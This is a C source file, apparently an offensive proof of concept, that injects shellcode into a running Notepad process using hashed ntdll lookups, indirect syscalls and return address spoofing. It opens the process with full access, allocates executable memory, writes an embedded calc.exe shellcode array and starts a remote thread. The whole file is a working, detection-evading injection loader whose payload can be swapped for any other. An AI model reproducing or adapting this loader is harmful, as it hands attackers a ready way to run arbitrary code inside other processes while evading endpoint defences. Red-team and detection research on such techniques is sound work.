#include "_wn64.h"
#include "_doom.h"

// Shellcode Execution with DoomSyscalls.
// 
// This is a proof-of-concept that applies both 
// indirect syscalls and return address spoofing.
// These principles apply to the lowest possible
// form of OS manipulation. With modern problems
// require old school brute-forcing.
//
//                   _,,,,_
//              .d;;;u;u;;i;i;:,
//            ,;"+++-<so7;;;:'"^;:.
//           d;YYYY$F7$7:;;uiuib.:;.
//          di;ii;iy;;;.;~^"^iui'?:;;
//         di;;ii;;;:;.;:;:;;iI; i;;;.
//        I;i;i^;;iu7^ "^;;:;Ii; ii;::
//         ?I;;iI7'. . . .;;i;ui ?i;;:
//          ?Si'. . . . .d;$iuiu;?i;:.
//          ,:, . . . .;;U;iuiui;?i:..
//          .: . . . .;$:i;i;ii;:];:`
//          p:.,.,.:;;$;!;\.!u;;:::`
//          ?u;;;;iI$;;:;:;\.;i;"`
//           `?~++~;i;!;:;:;"`
//             `~-~:i;,:,:"`
//               `~;;;"`

#define ROR7_32__NtQuerySystemInformation       0xEFFC1CF8
#define ROR7_32__NtOpenProcess                  0x7B736553
#define ROR7_32__NtAllocateVirtualMemory        0x014044AE
#define ROR7_32__NtWriteVirtualMemory           0x1130814D
#define ROR7_32__NtCreateThreadEx               0x93EC9D3D
#define ROR7_32__NtExitProcess                  0x618D8E8F

NTDLL_API NTDLL_API_ = { 0 };

VOID INIT_NTDLL_API() {
        GET_NTDLL_FUN(
                ROR7_32__NtQuerySystemInformation,
                &NTDLL_API_.NtQuerySystemInformation
        );
        GET_NTDLL_FUN(
                ROR7_32__NtOpenProcess,
                &NTDLL_API_.NtOpenProcess
        );
        GET_NTDLL_FUN(
                ROR7_32__NtAllocateVirtualMemory,
                &NTDLL_API_.NtAllocateVirtualMemory
        );
        GET_NTDLL_FUN(
                ROR7_32__NtWriteVirtualMemory,
                &NTDLL_API_.NtWriteVirtualMemory
        );
        GET_NTDLL_FUN(
                ROR7_32__NtCreateThreadEx,
                &NTDLL_API_.NtCreateThreadEx
        );
        GET_NTDLL_FUN(
                ROR7_32__NtExitProcess,
                &NTDLL_API_.NtExitProcess
        );
}

CHAR DOOM[] = 
        "DOOM (1993) is a seminal first-person shooter (FPS)"
        " developed by id Software that popularized the genr"
        "e, featuring fast-paced combat against demon hordes"
        " on Mars and in Hell. Players control an unnamed ma"
        "rine, 'Doomguy' navigating complex 2.5D levels, usi"
        "ng varied weapons like the shotgun and chainsaw. It"
        "s impact includes popularizing deathmatch, and modd"
        "ing. Doom is divided into three episodes, each cont"
        "aining eight main levels: 'Knee - Deep in the Dead'"
        ", 'The Shores of Hell', and 'Inferno'. A fourth epi"
        "sode, 'Thy Flesh Consumed', was added in an expande"
        "d version, The Ultimate Doom, released two years af"
        "ter Doom. The campaign contains very few plot eleme"
        "nts, with a minimal story presented mostly through "
        "the instruction manual and text descriptions betwee"
        "n episodes. While traversing the levels, the player"
        " must fight a variety of enemies, including demons "
        "and possessed undead humans. Enemies often appear i"
        "n large groups. The five difficulty levels adjust t"
        "he number of enemies and amount of damage they do, "
        "with enemies moving and attacking faster than norma"
        "l on the hardest difficulty setting.";

// "calc.exe" shellcode.

CHAR SHELLCODE[162] = {
        0x40, 0x80, 0xE4, 0xF0, 0x41, 0xBB, 0x51, 0x2F, 0xA2,
        0x01, 0x6A, 0x00, 0x48, 0xB9, 0x63, 0x61, 0x6C, 0x63,
        0x2E, 0x65, 0x78, 0x65, 0x51, 0x48, 0x89, 0xE1, 0x48,
        0x83, 0xEC, 0x20, 0x48, 0x83, 0xFC, 0x07, 0xE8, 0x07,
        0x00, 0x00, 0x00, 0x41, 0xBB, 0x56, 0x13, 0xEC, 0x6D,
        0x51, 0x65, 0x48, 0x8B, 0x14, 0x25, 0x60, 0x00, 0x00,
        0x00, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x30,
        0x74, 0x06, 0x48, 0x8B, 0x12, 0x48, 0x8B, 0x12, 0x48,
        0x8B, 0x52, 0x10, 0x8B, 0x6A, 0x3C, 0x48, 0x01, 0xD5,
        0x8B, 0xAD, 0x88, 0x00, 0x00, 0x00, 0x48, 0x01, 0xD5,
        0x44, 0x8B, 0x45, 0x18, 0x44, 0x8B, 0x4D, 0x20, 0x49,
        0x01, 0xD1, 0x49, 0xFF, 0xC8, 0x43, 0x8B, 0x34, 0x81,
        0x48, 0x01, 0xD6, 0x48, 0x31, 0xC0, 0x4D, 0x31, 0xD2,
        0xAC, 0x3C, 0x00, 0x74, 0x09, 0x41, 0xC1, 0xCA, 0x07,
        0x41, 0x01, 0xC2, 0xEB, 0xF2, 0x45, 0x39, 0xDA, 0x75,
        0xDD, 0x8B, 0x45, 0x24, 0x48, 0x01, 0xD0, 0x66, 0x46,
        0x8B, 0x04, 0x40, 0x8B, 0x45, 0x1C, 0x48, 0x01, 0xD0,
        0x42, 0x8B, 0x04, 0x80, 0x48, 0x01, 0xD0, 0xFF, 0xE0
};

INT UnicodeCompare(
        CONST PWCHAR UnicodeString1,
        CONST PWCHAR UnicodeString2
) {
        if (!UnicodeString1 || !UnicodeString2)
                return -1;

        USHORT A = 1, B = 1;

        while ((A && B) && (A == B)) {
                A = *UnicodeString1++;
                B = *UnicodeString2++;
        }
        return A - B;
}

HANDLE GET_PROC_ID(PWCHAR ProcessName) {
        // Viewing processes requires a query of system
        // information. Parse the query, find the desired
        // process name, save the ID.
        // NtQuerySystemInformation requires 4 parameters.
        //
        // RCX                  => Query type.
        // RDX                  => Buffer to write too.
        // R8                   => Size of buffer.
        // R9                   => Expected size of buffer.
        //
        // You can leave buffer and size empty, but you
        // will need to supply a pointer to an 8 byte
        // field to receive the "expected size".

        ULONG BufferSize;

        SET_SYSCALL(NTDLL_API_.NtQuerySystemInformation);
        if (NT_SUCCESS(RUN_SYSCALL(
                5,
                0,
                0,
                &BufferSize
        )))
                return 0;

        CHAR Buffer[BufferSize];

        for (ULONG index = 0; index < BufferSize; index++)
                Buffer[index] = 0;

        SET_SYSCALL(NTDLL_API_.NtQuerySystemInformation);
        if (!NT_SUCCESS(RUN_SYSCALL(
                5,
                Buffer,
                BufferSize,
                &BufferSize
        )))
                return 0;

        // Parse over all the information, leave when
        // name is found.

        PSYSTEM_PROCESS_INFORMATION pInformation = (PSYSTEM_PROCESS_INFORMATION)Buffer;

        while (UnicodeCompare(ProcessName, pInformation->ImageName.Buffer)) {
                if (!pInformation->NextEntryOffset)
                        return 0;

                pInformation = (PSYSTEM_PROCESS_INFORMATION) ((ULONG_PTR) pInformation + pInformation->NextEntryOffset);
        }
        return pInformation->UniqueProcessId;
}

// Windows ABI follows a standard calling convention.
//
// RCX                          => 1st parameter
// RDX                          => 2nd parameter
// R8                           => 3rd parameter
// R9                           => 4th parameter
// [RSP + 0x20]                 => 5th parameter
// [RSP + 0x28]                 => 6th parameter
// ...
// [RSP + 0x00 .. 0x18] Belong to the functions
// being called. This stack space is used to save
// any arguments that as may need be.

VOID main() {
        INIT_NTDLL_API();

        // NtOpenProcess requires 4 parameters.
        //
        // RCX                  => Pointer to handle.
        // RDX                  => Access mask.
        // R8                   => Pointer to Object Attributes
        // R9                   => Pointer to Client ID.

        HANDLE PROCESS;
        HANDLE THREAD;
        HANDLE PROC_ID = GET_PROC_ID(L"Notepad.exe");
        PVOID INJECT = NULL;
        ULONG_PTR SIZE = sizeof(SHELLCODE);

        OBJECT_ATTRIBUTES ObjectAttributes = {
                .Length = sizeof(OBJECT_ATTRIBUTES)
        };

        CLIENT_ID ClientId = {
                .UniqueProcess = PROC_ID
        };

        SET_SYSCALL(NTDLL_API_.NtOpenProcess);
        if (!NT_SUCCESS(RUN_SYSCALL(
                &PROCESS,
                PROCESS_ALL_ACCESS,
                &ObjectAttributes,
                &ClientId
        )))
                goto END;

        // NtAllocateVirtualMemory requires 6 parameters.
        //
        // RCX                  => Process handle.
        // RDX                  => Pointer to address.
        // R8                   => Zero bits.
        // R9                   => Pointer to size.
        // [RSP + 0x20]         => Memory mode.
        // [RSP + 0x28]         => Page mode.
        //
        // An important note: when allocating memory, the
        // OS will allocate according to PAGE. The return
        // address will be a new one on the start of this
        // said PAGE. If the address is already know, you
        // must respecify the address when writing memory.

        SET_SYSCALL(NTDLL_API_.NtAllocateVirtualMemory);
        if (!NT_SUCCESS(RUN_SYSCALL(
                PROCESS,
                &INJECT,
                NULL,
                &SIZE,
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE
        )))
                goto END;

        // NtWriteVirtualMemory requires 5 parameters.
        //
        // RCX                  => Process handle.
        // RDX                  => Pointer to address.
        // R8                   => Pointer to memory to copy.
        // R9                   => Length of memory to copy.
        // [RSP + 0x20]         => Pointer to bytes copied.

        SET_SYSCALL(NTDLL_API_.NtWriteVirtualMemory);
        if (!NT_SUCCESS(RUN_SYSCALL(
                PROCESS,
                INJECT,
                SHELLCODE,
                sizeof(SHELLCODE),
                &SIZE
        )))
                goto END;

        // NtCreateThreadEx requires 11 parameters.
        //
        // RCX                  => Pointer to thread handle.
        // RDX                  => Thread access.
        // R8                   => Pointer to object attributes
        // R9                   => Process handle.
        // [RSP + 0x20]         => Pointer to memory region.
        // [RSP + 0x28]         => Arguments.
        // [RSP + 0x30]         => Creation flags.
        // [RSP + 0x38]         => Zero bits.
        // [RSP + 0x40]         => Stack size.
        // [RSP + 0x48]         => Max stack size.
        // [RSP + 0x50]         => Attribute list.

        SET_SYSCALL(NTDLL_API_.NtCreateThreadEx);
        if (!NT_SUCCESS(RUN_SYSCALL(
                &THREAD,
                THREAD_ALL_ACCESS,
                NULL,
                PROCESS,
                INJECT,
                NULL,
                FALSE,
                NULL,
                NULL,
                NULL,
                NULL
        )))
                goto END;

END:
        SET_SYSCALL(NTDLL_API_.NtExitProcess);
        if (!NT_SUCCESS(RUN_SYSCALL(
                ZERO,
                ZERO
        )))
                return;
}